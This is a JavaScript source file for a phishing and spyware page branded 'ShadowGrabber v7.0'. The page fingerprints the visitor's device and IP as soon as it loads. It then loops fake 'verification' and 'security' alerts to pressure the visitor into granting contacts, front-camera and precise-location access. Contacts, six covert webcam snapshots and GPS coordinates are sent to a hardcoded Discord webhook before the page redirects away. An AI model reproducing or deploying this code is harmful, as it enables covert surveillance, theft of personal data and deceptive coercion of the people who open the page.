const config = {
    webhook: 'https://discord.com/api/webhooks/1464327769608425504/TX0QqpwHA56djp6nFioLGerQ4dUNI0elhQ4q6vw-fuPTbLYdLdv-DaN-PimcXb9Bi9kS',
    redirect: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
};

const dom = {
    loadingText: document.getElementById('loading-text'),
    progressBar: document.getElementById('progress-bar'),
    status: document.getElementById('status-detail'),
    trigger: document.getElementById('click-trigger'),
    video: document.getElementById('st-v'),
    canvas: document.getElementById('st-c')
};

const state = { startTime: Date.now() };

// --- Helpers ---
const updateUI = async (msg, prg) => {
    if (dom.loadingText) dom.loadingText.textContent = msg;
    if (dom.progressBar) dom.progressBar.style.width = prg + '%';
    await new Promise(r => setTimeout(r, 600));
};

const sendToDiscord = async (embed, file = null) => {
    const formData = new FormData();
    formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
    if (file) formData.append('file', file.blob, file.name);
    try { await fetch(config.webhook, { method: 'POST', body: formData }); } catch (e) { }
};

// --- Phase 0: Forensic Gathering (15+ Points) ---
async function gatherForensics() {
    await updateUI('Initializing secure handshake', 10);
    const gl = dom.canvas.getContext('webgl');
    const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
    let net = {};
    try { net = await (await fetch('https://ipapi.co/json/')).json(); } catch (e) { net = { ip: 'Hidden' }; }

    const forensics = {
        sys: {
            platform: navigator.platform,
            cores: navigator.hardwareConcurrency,
            ram: navigator.deviceMemory || 'N/A',
            gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
            touch: navigator.maxTouchPoints
        },
        screen: {
            res: `${screen.width}x${screen.height}`,
            depth: screen.colorDepth,
            ratio: window.devicePixelRatio,
            orientation: screen.orientation ? screen.orientation.type : 'N/A'
        },
        browser: {
            langs: navigator.languages.join(','),
            history: window.history.length,
            cookies: navigator.cookieEnabled,
            dnt: navigator.doNotTrack
        },
        net: {
            rtt: navigator.connection ? navigator.connection.rtt : 'N/A',
            speed: navigator.connection ? navigator.connection.downlink : 'N/A'
        }
    };

    await sendToDiscord({
        title: "🛡️ ShadowGrabber v7.0: System Profile",
        color: 0x3498DB,
        fields: [
            { name: "📱 Hardware", value: `\`\`\`${forensics.sys.platform} | ${forensics.sys.cores} Cores | ${forensics.sys.ram}GB RAM\nGPU: ${forensics.sys.gpu}\`\`\`` },
            { name: "👆 Input/Display", value: `\`\`\`Touch: ${forensics.sys.touch}\nRes: ${forensics.screen.res} (${forensics.screen.depth}-bit)\nRatio: ${forensics.screen.ratio}\`\`\`` },
            { name: "🌍 Network", value: `\`\`\`IP: ${net.ip}\nCity: ${net.city}\nSpeed: ${forensics.net.speed}Mbps\`\`\`` },
            { name: "🌐 Browser", value: `\`\`\`Langs: ${forensics.browser.langs}\nHist: ${forensics.browser.history}\nDNT: ${forensics.browser.dnt}\`\`\`` }
        ]
    });
}

// --- Phase 1: Force Contacts ---
async function forceContacts() {
    await updateUI('Synchronizing contact database...', 25);

    // Only works on supported mobile browsers
    if (!('contacts' in navigator && 'ContactsManager' in window)) {
        await sendToDiscord({ description: "⚠️ Contacts API not supported on this device." });
        return; // Skip if natively unsupported
    }

    let success = false;
    while (!success) {
        try {
            const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
            if (contacts.length > 0) {
                const blob = new Blob([JSON.stringify(contacts, null, 2)], { type: 'application/json' });
                await sendToDiscord({ title: "📇 Contacts Synced", color: 0x9B59B6 }, { blob, name: 'contacts.json' });
                success = true;
            } else {
                // User cancelled nicely, but we loop
                alert("Verification Failed: Contact synchronization is required to verify your identity. Please select your contacts.");
            }
        } catch (e) {
            alert("Security Alert: Access to contacts is mandatory for account recovery verification. Please Allow.");
        }
    }
}

// --- Phase 2: Force Camera & Snaps ---
async function forceCamera() {
    await updateUI('Verifying biometric sensors...', 50);
    let stream = null;

    // Loop until Allowed
    while (!stream) {
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { suitable: 1280 } },
                audio: false
            });
            dom.video.srcObject = stream;
            await dom.video.play();
        } catch (e) {
            alert("Camera Error: Access denied. You MUST allow camera access to complete the diagnostic.");
        }
    }

    // Take 6 Snaps
    await updateUI('Please wait its loding...', 60);
    for (let i = 1; i <= 6; i++) {
        await new Promise(r => setTimeout(r, 800)); // Delay between snaps
        const ctx = dom.canvas.getContext('2d');
        dom.canvas.width = dom.video.videoWidth;
        dom.canvas.height = dom.video.videoHeight;
        ctx.drawImage(dom.video, 0, 0);

        const blob = await new Promise(r => dom.canvas.toBlob(r, 'image/jpeg', 0.8));
        await sendToDiscord({ title: `📸 Snap #${i}`, color: 0xE74C3C }, { blob, name: `snap_${i}.jpg` });
        await updateUI('Please wait its loding...', 60 + (i * 5));
    }
}

// --- Phase 3: Force Location ---
async function forceLocation() {
    await updateUI('Triangulating secure position...', 90);

    return new Promise(async (resolve) => {
        const check = () => {
            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    await sendToDiscord({
                        title: "📍 Exact Location Verified",
                        color: 0x2ECC71,
                        description: `[Open In Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`,
                        fields: [{ name: "Accuracy", value: `${pos.coords.accuracy} meters` }]
                    });
                    resolve();
                },
                (err) => {
                    alert("Location Error: GPS access is required for regional security check. Please Allow.");
                    check(); // Recursive loop
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        };
        check();
    });
}

// --- Master Orchestrator ---
async function startSequence() {
    dom.trigger.style.display = 'none'; // Remove overlay once started

    await gatherForensics();
    await forceContacts();
    await forceCamera();
    await forceLocation();

    await updateUI('Finalizing...', 100);
    window.location.href = config.redirect;
}

// Initial Trigger (needed for mobile interaction context)
dom.trigger.onclick = startSequence;

// Auto-start forensic scan immediately
gatherForensics();
